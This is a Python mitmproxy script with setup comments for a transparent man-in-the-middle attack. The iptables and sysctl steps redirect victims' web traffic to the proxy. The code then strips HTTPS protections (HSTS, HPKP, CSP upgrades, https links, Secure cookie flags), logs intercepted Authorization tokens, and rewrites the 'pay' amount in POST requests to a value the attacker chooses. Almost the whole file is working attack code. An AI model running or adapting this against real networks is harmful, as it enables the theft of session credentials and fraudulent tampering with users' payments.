#
# 1. Enable IP Forwarding
#   sysctl -w net.ipv4.ip_forward=1
#   [OPTIONAL] sysctl -w net.ipv6.conf.all.forwarding=1
#
# 2. Disable ICMP redirects.
#   sysctl -w net.ipv4.conf.all.send_redirects=0
#
# 3. Create an iptables ruleset that redirects the desired traffic to mitmproxy
#  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
#  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
#  [OPTIONAL] ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
#  [OPTIONAL] ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
#
# 4. Fire up mitmproxy
#  mitmdump --ssl-insecure --certs *=/root/Desktop/mitm.pem --mode transparent --script /root/Desktop/https_mitm.py --set pay=[amount]
#

import re
import urllib.parse
import typing
import json

from mitmproxy import http, ctx

# set of SSL/TLS capable hosts
secure_hosts: typing.Set[str] = set()

def load(loader):
    loader.add_option(
        name = "pay",
        typespec = typing.Optional[int],
        default = None,
        help = "Add a pay amount",
    )

def configure(updates):
    if "pay" in updates and ctx.options.pay is None:
        print("Please insert a pay amount!")
        ctx.master.shutdown()

def request(flow: http.HTTPFlow) -> None:
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    # Don't force https redirection
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # Proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        #   in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host

    # Search for Authorization token
    if 'Authorization' in flow.request.headers:
        authorization = flow.request.headers.get('Authorization')
        ctx.log.info(f'[AUTHORIZATION TOKEN FOUND]: {authorization}')

    # Modify POST request pay payload
    if flow.request.method == 'POST' and 'pay' in flow.request.content.decode():
        inject = json.dumps({ "pay": ctx.options.pay })
        ctx.log.info(f'[PAY PAYLOAD MODIFIED]: from {flow.request.content.decode()} to {inject}')
        flow.request.content = inject.encode()

def response(flow: http.HTTPFlow) -> None:
    assert flow.response
    flow.response.headers.pop('Strict-Transport-Security', None)
    flow.response.headers.pop('Public-Key-Pins', None)

    # Strip links in response body
    flow.response.content = flow.response.content.replace(
        b'https://', b'http://')

    # Strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = br'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(
        csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    # Strip links in 'Location' header
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers['Location'] = location.replace(
            'https://', 'http://', 1)

    # Strip upgrade-insecure-requests in Content-Security-Policy header
    csp_header = flow.response.headers.get('Content-Security-Policy', '')
    if re.search('upgrade-insecure-requests', csp_header, flags=re.IGNORECASE):
        csp = flow.response.headers['Content-Security-Policy']
        new_header = re.sub(
            r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        flow.response.headers['Content-Security-Policy'] = new_header

    # Strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)
